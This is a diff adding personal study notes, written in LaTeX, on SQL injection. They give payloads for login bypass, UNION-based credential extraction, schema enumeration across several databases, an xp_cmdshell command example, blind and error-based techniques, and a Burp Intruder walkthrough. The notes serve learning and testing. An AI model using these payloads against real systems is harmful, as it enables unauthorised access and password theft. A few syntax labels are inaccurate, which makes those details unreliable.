@@ -7,19 +7,1470 @@
 \usepackage{listings}
 \usepackage{hyperref}
 \usepackage{multicol}
+\geometry{a4paper, left=20mm, right=20mm, top=20mm, bottom=20mm}
 \lstset{numbers=none, basicstyle=\ttfamily}
 \renewcommand{\lstlistingname}
 
-\geometry{a4paper, left=20mm, right=20mm, top=20mm, bottom=20mm}
+
 \title{SQLi notes}
-\date{Friday, October 3, 2025}
 \author{Eyad Islam El-Taher}
 
 \begin{document}
 \maketitle
 
 \section*{Introduction}
+SQL Injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It's one of the most common and dangerous web application vulnerabilities.
+
+\section*{How It Works}
+Attackers insert malicious SQL code into input fields (like login forms, search boxes, or URL parameters) that gets executed by the database.
+
+\section*{What is the impact of a successful SQL injection attack?}
+\begin{itemize}
+	\item Data Breach \& Unauthorized Data Access
+	\item Authentication Bypass
+	\item Data Manipulation \& Destruction
+	\item Remote Code Execution
+	\item Denial of Service (DoS)
+\end{itemize}
 
 
+\section*{Manual Detection Techniques}
+
+\subsection*{Input Field Testing}
+Test all user inputs with SQL-specific payloads:
+
+\subsubsection*{Basic Test Payloads}
+\begin{verbatim}
+' OR '1'='1
+" OR "1"="1' OR '1'='1' --
+" OR "1"="1" --
+' OR '1'='1' /*
+\end{verbatim}
+
+\subsubsection*{Numeric Input Testing}
+\begin{verbatim}
+1 OR 1=1
+1 AND 1=2
+1' OR '1'='1
+1" OR "1"="1
+\end{verbatim}
+
+\subsection*{1.2 Error-Based Detection}
+Inject syntax to generate database errors:
+\begin{verbatim}
+' -- 
+" -- 
+' # " # 
+' /* " /* \end{verbatim}
+
+\subsubsection*{Database-Specific Error Triggers}
+\begin{itemize}
+    \item \textbf{MySQL:} \texttt{' AND 1=CONVERT(int, @@version)--}
+    \item \textbf{MSSQL:} \texttt{' AND 1=CAST(@@version AS int)--}
+    \item \textbf{Oracle:} \texttt{' AND 1=TO\_NUMBER(USER)--}
+    \item \textbf{PostgreSQL:} \texttt{' AND 1=CAST(VERSION() AS int)--}
+\end{itemize}
+
+
+\section*{Example: Retrieve ALL Products}
+
+\textbf{Malicious URL:}
+\begin{verbatim}
+https://insecure-website.com/products?category=Gifts'+OR+1=1--
+\end{verbatim}
+
+\textbf{Resulting SQL Query:}
+\begin{verbatim}
+SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
+\end{verbatim}
+
+\textbf{How it works:}
+\begin{quote}
+\begin{itemize}
+    \item \texttt{OR 1=1} is a tautology (it is always true).
+    \item \texttt{---} comment the following part    \item The query effectively becomes: \textit{``Show products where category is Gifts OR (always true).''}
+    \item \textbf{Result:} The database ignores the original filtering and returns \textbf{ALL} products from \textbf{ALL} categories, including those that may not have been released yet.
+\end{itemize}
+\end{quote}
+
+\section*{Example: Password Bypass}
+
+\textbf{Attack Vector}
+
+\noindent \textbf{Malicious Input:}
+\begin{itemize}
+    \item \textbf{Username:} \texttt{administrator'---}
+    \item \textbf{Password:} (blank or anything)
+\end{itemize}
+
+\noindent \textbf{Resulting SQL Query:}
+\begin{verbatim}
+SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
+\end{verbatim}
+
+\medskip
+\textbf{How It Works}
+\begin{itemize}
+    \item \textbf{Username input:} \texttt{administrator'--}
+    \item Closes the username string with a single quote (\texttt{'}).
+    \item Adds the SQL comment symbol (\texttt{---}) to ignore the rest of the query.
+\end{itemize}
+
+\noindent \textbf{Query Transformation:}
+\begin{verbatim}
+Original:        WHERE username = '[input]' AND password = '[input]'
+After injection: WHERE username = 'administrator'--' AND password = ''
+                                       ^               ^
+                             Closes string here    Ignored as comment
+\end{verbatim}
+
+\noindent \textbf{Final Effective Query:}
+\begin{verbatim}
+SELECT * FROM users WHERE username = 'administrator'
+\end{verbatim}
+
+\begin{quote}
+    \textbf{Result:} No password check occurs. The database simply finds the user \texttt{administrator} and returns the record. The attacker logs in with full privileges without ever knowing the password.
+\end{quote}
+
+\newpage
+
+\section*{Types of SQL Injection}
+
+\subsection*{In-band SQLi}
+This is the most common type, where the attacker uses the same communication channel to launch the attack and gather results.
+
+\begin{itemize}
+    \item \textbf{UNION-based SQLi:} Leverages the \texttt{UNION} SQL operator to combine forged queries with the original query, forcing the application to return data from other tables.
+    \item \textbf{Error-based SQLi:} The attacker deliberately submits malformed input that causes the database to return error messages, which can reveal information about the structure of the database.
+\end{itemize}
+
+
+
+\subsection*{Blind SQLi}
+In this type, no data is transferred directly from the database to the attacker, so they cannot see the result of an attack in-band. Instead, they infer information by observing the server's behavior.
+
+\begin{itemize}
+    \item \textbf{Boolean-based (Content-based) Blind SQLi:} The attacker sends queries that force the application to return different results (e.g., true vs. false) based on whether the query holds.
+    \item \textbf{Time-based Blind SQLi:} The attacker injects a command that forces the database to wait (pause) for a specific amount of time before responding. If the response is delayed, the attacker knows the query was true.
+\end{itemize}
+
+
+
+\subsection*{Out-of-band SQLi}
+This is the least common type, used when the attacker cannot use the same channel to launch the attack and gather results. It requires specific database features (like \texttt{UTL\_HTTP} in Oracle) to make external network requests (DNS or HTTP) to a server controlled by the attacker.
+
+\subsection*{Other Notable SQLi Types}
+\begin{itemize}
+    \item \textbf{Second-Order SQLi:} The malicious input is stored by the application (e.g., in a user profile) and later executed in a different, vulnerable query, making it harder to detect via standard input validation.
+\end{itemize}
+
+
+\section*{SQL Injection: UNION-Based Data Theft}
+
+\subsection*{The Scenario}
+\textbf{Application:} Returns product data based on a category filter. \\
+\textbf{Normal Query:}
+\begin{verbatim}
+SELECT name, description FROM products WHERE category = 'Gifts'
+\end{verbatim}
+
+\subsection*{The Attack: UNION Data Exfiltration}
+\textbf{Malicious Input:}
+\begin{verbatim}
+' UNION SELECT username, password FROM users--
+\end{verbatim}
+
+\textbf{Resulting SQL Query:}
+\begin{verbatim}
+SELECT name, description FROM products WHERE category = 'Gifts' 
+UNION SELECT username, password FROM users--'
+\end{verbatim}
+
+
+
+\subsection*{Technical Requirements for UNION Attacks}
+A UNION attack will only succeed if two conditions are met:
+
+\medskip
+\noindent \textbf{1. Column Count Match} \\
+The \texttt{UNION} operator requires both \texttt{SELECT} statements to return the same number of columns.
+\begin{itemize}
+    \item \textbf{Method 1 (ORDER BY):} Increment the index until an error occurs.
+\begin{verbatim}
+' ORDER BY 1--  (Works)
+' ORDER BY 2--  (Works)
+' ORDER BY 3--  (Error! Conclusion: Only 2 columns exist)
+\end{verbatim}
+    \item \textbf{Method 2 (NULL Injection):}
+\begin{verbatim}
+' UNION SELECT NULL--            (Error)
+' UNION SELECT NULL, NULL--      (Works: 2 columns)
+\end{verbatim}
+\end{itemize}
+
+\noindent \textbf{2. Compatible Data Types} \\
+The data types in the injected query must match the data types of the original query columns (e.g., strings must go into string columns).
+\begin{verbatim}
+' UNION SELECT 'abc', NULL--     (Test if column 1 accepts strings)
+' UNION SELECT NULL, 'abc'--     (Test if column 2 accepts strings)
+\end{verbatim}
+
+\subsection*{Full Attack Sequence Example}
+\begin{description}
+    \item[Step 1: Find Structure] \texttt{category=Gifts' UNION SELECT NULL, NULL--}
+    \item[Step 2: Find Strings] \texttt{category=Gifts' UNION SELECT 'test', NULL--}
+    \item[Step 3: Extract Schema] (MySQL Example) \\
+    \texttt{' UNION SELECT table\_name, NULL FROM information\_schema.tables--}
+    \item[Step 4: Extract Data] 
+    \texttt{' UNION SELECT username, password FROM users--}
+\end{description}
+
+\begin{quote}
+    \textbf{Result:} The application UI, which normally displays product names and descriptions, will now display the \textbf{usernames} and \textbf{passwords} from the users table.
+\end{quote}
+
+
+
+\section*{Database-Specific SQL Injection Syntax}
+
+\subsection*{Key Differences Explained}
+Different database systems (DBMS) have unique syntax requirements. A payload that works on MySQL may fail on Oracle or PostgreSQL due to structural differences.
+
+\subsubsection*{Oracle Database Special Requirements}
+Oracle requires every \texttt{SELECT} statement to have a \texttt{FROM} clause.
+\begin{itemize}
+    \item \textbf{The DUAL Table:} A special one-row table used when no actual table is needed (e.g., \texttt{' UNION SELECT NULL, NULL FROM DUAL---}).
+    \item \textbf{Example Attack:} \texttt{' UNION SELECT banner, NULL FROM v\$version---}
+\end{itemize}
+
+\subsubsection*{MySQL Specific Syntax}
+\begin{itemize}
+    \item \textbf{Comment Variations:} MySQL uses \texttt{\#}, \texttt{/* */}, or \texttt{--- } (Note: The double-dash \textbf{must} be followed by a space).
+    \item \textbf{System Functions:} Use \texttt{@@version} for the version and \texttt{user()} for the current user.
+\end{itemize}
+
+\subsubsection*{Microsoft SQL Server (MSSQL)}
+\begin{itemize}
+    \item \textbf{Stacked Queries:} Often allows executing multiple statements using a semicolon.
+    \item \textbf{Dangerous Features:} \texttt{'; EXEC xp\_cmdshell 'whoami'--} can lead to OS-level command execution.
+\end{itemize}
+
+\subsection*{Quick Reference Table}
+
+\begin{center}
+\begin{tabular}{|l|l|l|l|}
+\hline
+\textbf{Database} & \textbf{Comment Syntax} & \textbf{Version Query} & \textbf{System Table} \\ \hline
+Oracle     & \texttt{---}             & \texttt{v\$version}     & \texttt{all\_tables}  \\ \hline
+MySQL      & \texttt{\#}, \texttt{--- } & \texttt{@@version}      & \texttt{information\_schema} \\ \hline
+MSSQL      & \texttt{---}, \texttt{/**/} & \texttt{@@version}      & \texttt{sys.tables}   \\ \hline
+PostgreSQL & \texttt{---}, \texttt{/**/} & \texttt{version()}      & \texttt{pg\_tables}   \\ \hline
+\end{tabular}
+\end{center}
+
+\subsection*{Practical Examples by DBMS}
+
+\noindent \textbf{Extracting Table Names:}
+\begin{itemize}
+    \item \textbf{MySQL:} \texttt{' UNION SELECT table\_name, NULL FROM information\_schema.tables\#}
+    \item \textbf{Oracle:} \texttt{' UNION SELECT table\_name, NULL FROM all\_tables---}
+    \item \textbf{PostgreSQL:} \texttt{' UNION SELECT tablename, NULL FROM pg\_tables---}
+\end{itemize}
+
+
+\section*{SQL Injection: Concatenating Multiple Values}
+
+\subsection*{The Problem}
+In many UNION-based attacks, the original query may only return a **single column**. If an attacker needs to extract multiple fields (like both \texttt{username} AND \texttt{password}), they must combine them into one string.
+
+\subsection*{Database-Specific Concatenation Syntax}
+Different DBMS engines use different operators to join strings together:
+
+\begin{center}
+\begin{tabular}{|l|l|l|}
+\hline
+\textbf{Database} & \textbf{Operator / Function} & \textbf{Example Payload} \\ \hline
+Oracle         & \texttt{||}                  & \texttt{username || '\~{}' || password} \\ \hline
+MySQL          & \texttt{CONCAT()}            & \texttt{CONCAT(username, '\~{}', password)} \\ \hline
+MSSQL          & \texttt{+}                   & \texttt{username + '\~{}' + password} \\ \hline
+PostgreSQL     & \texttt{||} or \texttt{CONCAT()} & \texttt{username || '\~{}' || password} \\ \hline
+\end{tabular}
+\end{center}
+
+
+
+\subsection*{Practical Attack Scenarios}
+
+\subsubsection*{Scenario: Single Column UNION}
+If the vulnerable query only returns the \texttt{product\_name}, use the following to steal credentials:
+
+\medskip
+\noindent \textbf{Oracle Payload:}
+\begin{verbatim}
+' UNION SELECT username || ':' || password FROM users--
+\end{verbatim}
+
+\noindent \textbf{MySQL Payload:}
+\begin{verbatim}
+' UNION SELECT CONCAT(username, ':', password) FROM users#
+\end{verbatim}
+
+\subsection*{Handling NULL Values}
+A common pitfall in concatenation is that if one column (like \texttt{password}) is \texttt{NULL}, the entire result might become \texttt{NULL}. 
+
+\begin{itemize}
+    \item \textbf{Oracle/PostgreSQL:} Use \texttt{COALESCE(password, ' ')}
+    \item \textbf{MySQL:} Use \texttt{CONCAT\_WS('\~{}', username, password)} (automatically skips NULLs)
+\end{itemize}
+
+\subsection*{Real-World Attack Example}
+\textbf{Target URL:} \texttt{https://bank.com/transaction?id=123} \\
+\textbf{Goal:} Extract User, Password, and Email via a 1-column result.
+
+\begin{description}
+    \item[Step 1: Test Column Count] \hfill \\
+    \texttt{id=123' ORDER BY 1--} (Works) \\
+    \texttt{id=123' ORDER BY 2--} (Error) $\rightarrow$ \textbf{Result: 1 Column}
+    
+    \item[Step 2: Execute Concatenated Extraction] \hfill \\
+    \texttt{id=123' UNION SELECT username || '|' || password || '|' || email FROM users--}
+\end{description}
+
+\textbf{Expected Output on Page:}
+\begin{verbatim}
+Transaction: Payment to Vendor X
+admin|P@ssw0rd2024|admin@bank.com
+jsmith|Winter2023|john@bank.com
+\end{verbatim}
+
+\newpage
+
+
+\section*{Oracle Database Version Enumeration}
+
+\subsection*{Attack Objective}
+Determining the specific Oracle version is critical for identifying known CVEs and adapting payloads to match Oracle's strict syntax requirements.
+
+\subsection*{Prerequisite: Column Discovery}
+Before extracting version info, you must identify the column structure.
+
+\medskip
+\noindent \textbf{Step 1: Determine Number of Columns}
+\begin{verbatim}
+' ORDER BY 1--     (Works)
+' ORDER BY 2--     (Works)
+' ORDER BY 3--     (Error! Result: 2 columns)
+\end{verbatim}
+
+\noindent \textbf{Step 2: Verify Text Columns} \\
+Oracle requires the \texttt{FROM dual} clause for these tests.
+\begin{verbatim}
+' UNION SELECT 'abc', 'def' FROM dual--
+\end{verbatim}
+
+\subsection*{Version Enumeration Methods}
+
+\textbf{Method 1: Using v\$version (Most Comprehensive)}
+\begin{verbatim}
+' UNION SELECT banner, NULL FROM v$version--
+\end{verbatim}
+
+\textbf{Method 2: Using v\$instance}
+\begin{verbatim}
+' UNION SELECT version, NULL FROM v$instance--
+\end{verbatim}
+
+\subsection*{Understanding Oracle Version Output}
+When you query \texttt{v\$version}, Oracle returns a detailed banner string.
+
+
+
+\begin{quote}
+\textbf{Example Output:} \\
+\texttt{Oracle Database 19c Enterprise Edition Release 19.0.0.0.0 - Production}
+\begin{itemize}
+    \item \textbf{19c}: Version Market Name
+    \item \textbf{Enterprise}: Database Edition
+    \item \textbf{19.0.0.0.0}: Internal Version Number (Major.Minor.Build)
+\end{itemize}
+\end{quote}
+
+\subsection*{Complete Attack Sequence (URL Construction)}
+
+\begin{enumerate}
+    \item \textbf{Base URL:} \texttt{https://shop.com/products?category=Gifts}
+    \item \textbf{Test Count:} \texttt{...category=Gifts' ORDER BY 3--} (Trigger Error)
+    \item \textbf{Test Types:} \texttt{...category=Gifts' UNION SELECT 'a', 'b' FROM dual--}
+    \item \textbf{Get Version:} \texttt{...category=Gifts' UNION SELECT banner, NULL FROM v\$version--}
+\end{enumerate}
+
+\subsection*{Quick Reference Table: Oracle Version Tables}
+
+\begin{center}
+\begin{tabular}{|l|l|}
+\hline
+\textbf{Table Name} & \textbf{Purpose} \\ \hline
+\texttt{v\$version} & Complete version and component info. \\ \hline
+\texttt{v\$instance} & Specific instance version number. \\ \hline
+\texttt{product\_component\_version} & Individual versions of installed components. \\ \hline
+\end{tabular}
+\end{center}
+
+\begin{quote}
+    \textbf{Note:} If you encounter a "Table or view does not exist" error, the database user may have restricted permissions on \texttt{v\$version}. In such cases, try \texttt{product\_component\_version} as an alternative.
+\end{quote}
+
+\newpage
+
+\section*{Oracle Database Schema Enumeration}
+
+\subsection*{The Objective}
+Once the database type (Oracle) and column count are confirmed, the next step is to map the database structure. This involves finding the names of tables that might contain sensitive data and then identifying the columns within those tables.
+
+\subsection*{Step 1: Listing All Tables}
+In Oracle, the \texttt{all\_tables} view contains a list of all tables accessible to the current user.
+
+\medskip
+\noindent \textbf{Attack Payload (URL Encoded):}
+\begin{verbatim}
+'+UNION+SELECT+table_name,NULL+FROM+all_tables--
+\end{verbatim}
+
+\noindent \textbf{Decoded SQL:}
+\begin{verbatim}
+' UNION SELECT table_name, NULL FROM all_tables--
+\end{verbatim}
+
+\noindent \textbf{Example Output on Page:}
+\begin{quote}
+    \texttt{USERS\_ABCDEF} \\
+    \texttt{PRODUCTS} \\
+    \texttt{ORDERS} \\
+    \texttt{PAYMENTS} \\
+    \texttt{ADMIN\_SETTINGS}
+\end{quote}
+
+
+
+\subsection*{Step 2: Listing Columns of a Specific Table}
+After identifying a suspicious table (e.g., \texttt{USERS\_ABCDEF}), you must query \texttt{all\_tab\_columns} to find where the credentials are stored.
+
+\medskip
+\noindent \textbf{Attack Payload (URL Encoded):}
+\begin{verbatim}
+'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
+\end{verbatim}
+
+\noindent \textbf{Decoded SQL:}
+\begin{verbatim}
+' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_ABCDEF'--
+\end{verbatim}
+
+\noindent \textbf{Example Output on Page:}
+\begin{quote}
+    \texttt{USER\_ID} \\
+    \texttt{USERNAME} \\
+    \texttt{PASSWORD} \\
+    \texttt{EMAIL} \\
+    \texttt{IS\_ADMIN}
+\end{quote}
+
+\subsection*{Pro-Tip: Filtering System Tables}
+Oracle contains many internal system tables that can clutter your results. To find "user-defined" tables, you can add a filter for the owner:
+
+\begin{verbatim}
+' UNION SELECT table_name, NULL FROM all_tables WHERE owner != 'SYS'--
+\end{verbatim}
+
+\begin{quote}
+    \textbf{Summary:} By combining these two steps, an attacker moves from blind guessing to a targeted extraction of the \texttt{USERNAME} and \texttt{PASSWORD} columns from the \texttt{USERS\_ABCDEF} table.
+\end{quote}
+
+\section*{Database Enumeration Using INFORMATION\_SCHEMA}
+
+\subsection*{Overview}
+The \texttt{INFORMATION\_SCHEMA} is a standardized, read-only set of views available in MySQL, PostgreSQL, and SQL Server. It provides metadata about the database structure. **Oracle** is the notable exception, as it uses its own system views (e.g., \texttt{all\_tables}).
+
+\subsection*{INFORMATION\_SCHEMA vs. Oracle System Views}
+
+\begin{center}
+\begin{tabular}{|l|l|l|}
+\hline
+\textbf{Database} & \textbf{Table Metadata} & \textbf{Column Metadata} \\ \hline
+MySQL / MariaDB    & \texttt{information\_schema.tables}  & \texttt{information\_schema.columns} \\ \hline
+PostgreSQL         & \texttt{information\_schema.tables}  & \texttt{information\_schema.columns} \\ \hline
+SQL Server (MSSQL) & \texttt{information\_schema.tables}  & \texttt{information\_schema.columns} \\ \hline
+Oracle             & \texttt{all\_tables}                 & \texttt{all\_tab\_columns}           \\ \hline
+\end{tabular}
+\end{center}
+
+
+
+\subsection*{Core Enumeration Payloads}
+
+\subsubsection*{Listing All Tables}
+To retrieve table names across the database:
+\begin{verbatim}
+' UNION SELECT table_name, NULL FROM information_schema.tables--
+\end{verbatim}
+
+\subsubsection*{Listing Columns for a Specific Table}
+To identify sensitive fields within a target table (e.g., 'Users'):
+\begin{verbatim}
+' UNION SELECT column_name, data_type FROM information_schema.columns 
+WHERE table_name='Users'--
+\end{verbatim}
+
+\subsection*{DBMS-Specific Variations}
+
+\noindent \textbf{MySQL / MariaDB:}
+\begin{verbatim}
+-- List all available databases (schemas)
+' UNION SELECT schema_name, NULL FROM information_schema.schemata--
+
+-- Extract columns and data types in a single string
+' UNION SELECT CONCAT(column_name, ' (', data_type, ')'), NULL 
+FROM information_schema.columns WHERE table_name='users'--
+\end{verbatim}
+
+\noindent \textbf{Microsoft SQL Server:}
+\begin{verbatim}
+-- List all database names
+' UNION SELECT name, NULL FROM sys.databases--
+
+-- Join system tables for detailed column types
+' UNION SELECT c.name + ' (' + t.name + ')', NULL FROM sys.columns c 
+JOIN sys.types t ON c.user_type_id = t.user_type_id 
+WHERE object_id = OBJECT_ID('Users')--
+\end{verbatim}
+
+\subsection*{Complete Attack Workflow}
+
+\begin{description}
+    \item[Step 1: Database Discovery] Identify the current database context using \texttt{schemata} or \texttt{sys.databases}.
+    \item[Step 2: Filter for User Tables] Ignore system noise by filtering out \texttt{information\_schema} and \texttt{pg\_catalog}.
+    \begin{verbatim}
+    ' UNION SELECT table_name, table_schema FROM information_schema.tables 
+    WHERE table_schema NOT IN ('information_schema', 'sys', 'pg_catalog')--
+    \end{verbatim}
+    \item[Step 3: Target "Interesting" Tables] Search for keywords like \textit{user, auth, account,} or \textit{pass}.
+    \begin{verbatim}
+    ... WHERE table_name LIKE '%user%' OR table_name LIKE '%pass%'--
+    \end{verbatim}
+    \item[Step 4: Data Extraction] Combine the discovered column names into a final query.
+    \begin{verbatim}
+    ' UNION SELECT CONCAT(username, ':', password), NULL FROM users--
+    \end{verbatim}
+\end{description}
+
+\begin{quote}
+    \textbf{Note:} When using \texttt{WHERE table\_name='Users'}, remember that some databases (like PostgreSQL) are case-sensitive. If 'Users' returns no results, try 'users'.
+\end{quote}
+
+\newpage
+
+\section*{Blind SQL Injection}
+
+\subsection*{What is Blind SQL Injection?}
+Blind SQL injection occurs when an application is vulnerable to injection, but its HTTP responses do not contain the results of the relevant SQL queries or any database errors. 
+
+\begin{itemize}
+    \item \textbf{No Visible Data:} Injected query results are never displayed.
+    \item \textbf{No Error Messages:} The application handles database errors gracefully, showing only a generic "Error" page or a normal page.
+    \item \textbf{Behavioral Inference:} Attackers must infer data by observing \textit{how} the application responds (e.g., changes in content or response time).
+\end{itemize}
+
+
+
+\subsection*{Types of Blind SQL Injection}
+
+\subsubsection*{Boolean-Based Blind SQLi}
+The application responds differently based on whether a condition is \textbf{TRUE} or \textbf{FALSE}.
+
+\medskip
+\noindent \textbf{Detection Logic:}
+\begin{verbatim}
+-- Scenario: id=1 returns a "Product Details" page.
+
+?id=1 AND 1=1  --> Returns "Product Details" (TRUE condition)
+?id=1 AND 1=2  --> Returns "Product Not Found" (FALSE condition)
+\end{verbatim}
+
+\noindent \textbf{The Attack:}
+By using string functions, an attacker can guess a password character by character:
+\begin{verbatim}
+-- "Does the admin password start with 'a'?"
+' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a'--
+\end{verbatim}
+
+\subsubsection*{Time-Based Blind SQLi}
+The attacker injects a command that forces the database to wait (pause) for a specific amount of time if a condition is true.
+
+\medskip
+\noindent \textbf{Detection Logic:}
+\begin{verbatim}
+-- If the condition is TRUE, the server waits 5 seconds before responding.
+
+-- MySQL Example:
+?id=1 AND IF(1=1, SLEEP(5), 0) -- (Page loads in 5s)
+?id=1 AND IF(1=2, SLEEP(5), 0) -- (Page loads instantly)
+\end{verbatim}
+
+
+
+\subsection*{Database-Specific Time Delays}
+
+\begin{center}
+\begin{tabular}{|l|l|}
+\hline
+\textbf{Database} & \textbf{Delay Command} \\ \hline
+MySQL             & \texttt{SLEEP(5)} \\ \hline
+PostgreSQL        & \texttt{pg\_sleep(5)} \\ \hline
+MSSQL             & \texttt{WAITFOR DELAY '0:0:5'} \\ \hline
+Oracle            & \texttt{dbms\_pipe.receive\_message(('a'), 5)} \\ \hline
+\end{tabular}
+\end{center}
+
+\subsection*{Why Blind SQLi is Challenging}
+Unlike UNION-based attacks which retrieve entire tables in one go, Blind SQLi requires hundreds or thousands of requests to extract a single password.
+
+\begin{quote}
+    \textbf{Example Process:}
+    \begin{enumerate}
+        \item Ask: Is the password length 8? (No delay)
+        \item Ask: Is the password length 9? (Delay! Result: Length is 9)
+        \item Ask: Is the 1st character 'a'? (No delay)
+        \item Ask: Is the 1st character 'b'? (Delay! Result: 1st char is 'b')
+    \end{enumerate}
+\end{quote}
+
+\section*{Blind SQLi: Boolean Condition Testing}
+
+\subsection*{Step 1: Confirming the Vulnerability}
+In a boolean blind attack, we look for a change in the page content (e.g., a "Welcome back" message appearing or disappearing) based on our injected logic.
+
+\medskip
+\noindent \textbf{TRUE Condition (Data is returned):}
+\begin{verbatim}
+TrackingId=xyz' AND '1'='1
+\end{verbatim}
+\textit{Result:} \texttt{SELECT ... WHERE TrackingId = 'xyz' AND '1'='1'} \\
+Logic is \textbf{TRUE} $\rightarrow$ Page shows "Welcome back".
+
+\medskip
+\noindent \textbf{FALSE Condition (No data returned):}
+\begin{verbatim}
+TrackingId=xyz' AND '1'='2
+\end{verbatim}
+\textit{Result:} \texttt{SELECT ... WHERE TrackingId = 'xyz' AND '1'='2'} \\
+Logic is \textbf{FALSE} $\rightarrow$ Page does \textbf{not} show "Welcome back".
+
+
+
+\subsection*{Password Extraction Process}
+We can use the \texttt{SUBSTRING} function to isolate one character at a time and test it against the alphabet.
+
+\subsubsection*{The Extraction Algorithm}
+To find the first character of the \texttt{Administrator} password:
+
+\begin{enumerate}
+    \item \textbf{Test Range (Higher/Lower):}
+    \begin{verbatim}
+    xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'), 1, 1) > 'm'--
+    \end{verbatim}
+    Response: "Welcome back" $\rightarrow$ \textbf{TRUE}. The character is in the second half of the alphabet.
+
+    \item \textbf{Narrow the Search:}
+    \begin{verbatim}
+    xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'), 1, 1) > 't'--
+    \end{verbatim}
+    Response: No message $\rightarrow$ \textbf{FALSE}. The character is between 'n' and 't'.
+
+    \item \textbf{Confirm the Character:}
+    \begin{verbatim}
+    xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'), 1, 1) = 's'--
+    \end{verbatim}
+    Response: "Welcome back" $\rightarrow$ \textbf{CONFIRMED}. The first character is \textbf{'s'}.
+\end{enumerate}
+
+\section*{Burp Suite Blind SQL Injection Walkthrough}
+
+\subsection*{Initial Reconnaissance}
+The goal of this phase is to capture a baseline request and identify where the injection point lies.
+
+\begin{itemize}
+    \item \textbf{Intercept Request:} Navigate to the shop front page. Burp Suite Proxy intercepts the request containing the session cookie:
+    \begin{verbatim}
+    Cookie: TrackingId=xyz
+    \end{verbatim}
+\end{itemize}
+
+
+
+\subsection*{Confirm Blind SQL Injection Vulnerability}
+We must observe how the application handles logical truths versus logical falsehoods.
+
+\begin{itemize}
+    \item \textbf{Test 1: Always TRUE condition}
+    \begin{verbatim}
+    Cookie: TrackingId=xyz' AND '1'='1
+    \end{verbatim}
+    \textbf{Result:} "Welcome back" appears in the response body.
+
+    \item \textbf{Test 2: Always FALSE condition}
+    \begin{verbatim}
+    Cookie: TrackingId=xyz' AND '1'='2
+    \end{verbatim}
+    \textbf{Result:} "Welcome back" disappears.
+\end{itemize}
+
+\textit{Conclusion: The difference in the response content confirms a Boolean-based blind SQL injection vulnerability.}
+
+\subsection*{Database Enumeration}
+Once confirmed, we move to identifying specific tables and users within the database.
+
+\begin{itemize}
+    \item \textbf{Test 3: Confirm if 'users' table exists}
+    \begin{verbatim}
+    Cookie: TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
+    \end{verbatim}
+    \textbf{Result:} "Welcome back" appears $\rightarrow$ The \texttt{users} table exists.
+
+    \item \textbf{Test 4: Confirm if 'administrator' user exists}
+    \begin{verbatim}
+    Cookie: TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+    \end{verbatim}
+    \textbf{Result:} "Welcome back" appears $\rightarrow$ The \texttt{administrator} user exists.
+\end{itemize}
+
+
+
+\subsection*{Determine Password Length}
+Before extracting characters, we must know how many times we need to iterate.
+
+\begin{itemize}
+    \item \textbf{Test 5: Testing password length}
+    \begin{verbatim}
+    Cookie: TrackingId=xyz' AND (SELECT 'a' FROM users 
+    WHERE username='administrator' AND LENGTH(password)>1)='a
+    \end{verbatim}
+    \item \textbf{Procedure:} Increment the number (e.g., \texttt{>2}, \texttt{>3}, etc.) until the "Welcome back" message disappears. 
+    \item If \texttt{LENGTH(password)>19} is TRUE but \texttt{LENGTH(password)>20} is FALSE, the password is exactly 20 characters long.
+\end{itemize}
+
+\subsection*{Extract Password Character by Character}
+
+\subsection*{Prepare for Burp Intruder Attack}
+To avoid manual testing for every character, we use Burp Intruder to automate the extraction process.
+
+\subsection*{Set Payload Positions}
+In the \textbf{Positions} tab, identify the character you want to test and wrap it in payload markers ($\S$). 
+
+\medskip
+\noindent \textbf{Targeted Cookie String:}
+\begin{verbatim}
+TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users 
+WHERE username='administrator')='§a§
+\end{verbatim}
+
+
+
+\subsection*{Payload Configuration}
+\begin{itemize}
+    \item \textbf{Payload Options:} Add the character set you want to test against (e.g., a--z, 0--9). You can use the "Add from list" feature in Burp to quickly populate common alphanumeric sets.
+\end{itemize}
+
+\subsection*{Analyzing the Results}
+Once the attack is started, monitor the \textbf{Render} tab or the \textbf{Length} column.
+
+\begin{itemize}
+    \item Most requests will return a "False" response (page without "Welcome back").
+    \item One specific request (e.g., for the letter 's') will result in a different response length or the "Welcome back" string.
+    \item \textbf{Result:} This confirms the first character of the password.
+\end{itemize}
+
+\section*{Error-Based SQL Injection}
+
+\subsection*{What is Error-Based SQL Injection?}
+Error-based SQL injection exploits database error messages to extract or infer sensitive data. This is used when an application doesn't show direct query results but its behavior changes when a database-level error occurs.
+
+
+
+\subsection*{Two Types of Error-Based SQLi}
+\begin{itemize}
+    \item \textbf{Conditional Error-Based (Blind):} Triggers an error only when a specific condition is TRUE. You infer data by the presence or absence of an error response.
+    \item \textbf{Verbose Error-Based (Visible):} Manipulates the query so the database error message itself contains the requested data (e.g., the version string or a password).
+\end{itemize}
+
+\subsection*{Conditional Error-Based SQL Injection}
+The core concept is using a \texttt{CASE} statement to force a database error (like divide-by-zero) only when a condition is met.
+
+\medskip
+\noindent \textbf{Basic Example:}
+\begin{verbatim}
+xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
+\end{verbatim}
+
+\noindent \textbf{The Breakdown:}
+\begin{itemize}
+    \item \textbf{Condition TRUE:} Hits \texttt{1/0} $\rightarrow$ Database Error $\rightarrow$ Application shows "Internal Server Error".
+    \item \textbf{Condition FALSE:} Hits \texttt{ELSE 'a'} $\rightarrow$ Normal execution $\rightarrow$ Application shows "Welcome back" or normal content.
+\end{itemize}
+
+
+
+\subsection*{Practical Attack Examples}
+
+\textbf{Testing Simple Conditions}
+\begin{verbatim}
+-- Should cause error (TRUE)
+xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
+
+-- Should NOT cause error (FALSE)
+xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
+\end{verbatim}
+
